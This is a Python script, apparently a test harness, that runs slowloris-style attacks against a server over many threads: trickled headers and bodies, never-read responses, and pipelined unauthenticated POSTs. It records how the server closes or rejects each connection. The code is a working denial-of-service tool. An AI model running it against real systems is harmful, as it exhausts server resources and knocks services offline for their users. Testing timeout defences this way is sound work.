# Attack modes, N connections, each reconnecting after the server closes it:
#  header: unterminated 15 KiB head, then 1 byte/s
#  body:   POST /api/login head with Content-Length 64, then 1 body byte/s
#  noread: GET the largest asset, tiny receive buffer, never read
#  pipe401: pipeline POST to the streaming paths with no session, tiny
#           receive buffer, never read (the 401/405 answers must not
#           exempt the connection from the write-stall timeout)
import json, os, socket, sys, threading, time
host, port, mode, n, dur, asset, out = sys.argv[1], int(sys.argv[2]), sys.argv[3], int(sys.argv[4]), float(sys.argv[5]), sys.argv[6], sys.argv[7]
st = {"mode": mode, "connects": 0, "closed_by_server": 0, "refused_503": 0, "answered_408": 0, "connect_errors": 0, "held_s": []}
lock = threading.Lock(); stop = time.monotonic() + dur
def worker():
    while time.monotonic() < stop:
        try:
            s = socket.socket(); 
            if mode in ("noread", "pipe401"): s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2048)
            s.settimeout(5); s.connect((host, port))
        except Exception:
            with lock: st["connect_errors"] += 1
            time.sleep(0.5); continue
        t0 = time.monotonic()
        with lock: st["connects"] += 1
        try:
            if mode == "header":
                s.sendall(b"GET /api/v1/session HTTP/1.1\r\nHost: x\r\nX-Pad: " + b"a" * 15000)
            elif mode == "body":
                s.sendall(f"POST /api/login HTTP/1.1\r\nHost: {host}:{port}\r\nOrigin: http://{host}:{port}\r\nContent-Type: application/json\r\nContent-Length: 64\r\n\r\n{{".encode())
            elif mode == "noread":
                s.sendall(f"GET {asset} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode())
            s.setblocking(False)
            closed = False
            if mode == "pipe401":
                paths = ["/api/v1/stream?topics=boards", "/api/logs/stream?c=x", "/api/logs/download?c=x"]
                batch = b"".join(f"POST {p} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode() for p in paths) * 32
                pending = batch
                while time.monotonic() < stop and not closed:
                    if time.monotonic() - t0 > 60: break
                    try:
                        sent = s.send(pending); pending = pending[sent:] or batch
                    except BlockingIOError: time.sleep(0.2)
                    except OSError: closed = True
                if closed:
                    with lock: st["closed_by_server"] += 1; st["held_s"].append(round(time.monotonic() - t0, 1))
                continue
            while time.monotonic() < stop and not closed:
                if mode != "noread":
                    try:
                        d = s.recv(4096)
                        if not d: closed = True; break
                        with lock:
                            if d.startswith(b"HTTP/1.1 503"): st["refused_503"] += 1
                            if d.startswith(b"HTTP/1.1 408"): st["answered_408"] += 1
                        closed = True; break
                    except BlockingIOError: pass
                    except OSError: closed = True; break
                    try: s.send(b"a")
                    except BlockingIOError: pass
                    except OSError: closed = True; break
                elif time.monotonic() - t0 > 20:
                    # Never read; open a fresh one every 20 s. Whether the
                    # server let go is measured on its side (open fds).
                    break
                time.sleep(1)
            if closed:
                with lock: st["closed_by_server"] += 1; st["held_s"].append(round(time.monotonic() - t0, 1))
        finally:
            s.close()
ts = [threading.Thread(target=worker, daemon=True) for _ in range(n)]
for t in ts: t.start()
open(os.path.join(out, "ready"), "w").write("1")
for t in ts: t.join(dur + 30)
h = sorted(st.pop("held_s")); st["held_median_s"] = h[len(h)//2] if h else None; st["held_max_s"] = h[-1] if h else None
json.dump(st, open(os.path.join(out, "attack.json"), "w"))
